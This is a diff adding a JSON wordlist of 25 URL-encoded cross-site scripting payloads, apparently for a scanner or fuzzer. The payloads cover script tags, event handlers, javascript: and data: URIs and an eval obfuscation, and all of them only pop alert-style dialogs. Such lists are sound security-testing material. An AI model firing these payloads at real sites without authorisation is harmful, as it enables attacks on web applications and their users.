@@ -1,0 +1,29 @@
+{
+  "xss": [
+    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+    "%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "%3Csvg%2Fonload%3Dalert%281%29%3E",
+    "%3Cbody%20onload%3Dalert%281%29%3E",
+    "%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E",
+    "%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E",
+    "%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E",
+    "%3Ca%20href%3Djavascript%3Aalert%281%29%3Ex%3C%2Fa%3E",
+    "%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%3E",
+    "%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E",
+    "%3Cmarquee%20onstart%3Dalert%281%29%3E",
+    "%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E",
+    "%3Cobject%20data%3D%22javascript%3Aalert%281%29%22%3E",
+    "%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "%3Cscript%3Ealert%601%60%3C%2Fscript%3E",
+    "%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B",
+    "javascript%3Aalert%281%29",
+    "data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D",
+    "eval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29",
+    "prompt%281%29",
+    "confirm%281%29",
+    "print%28%29"
+  ]
+}
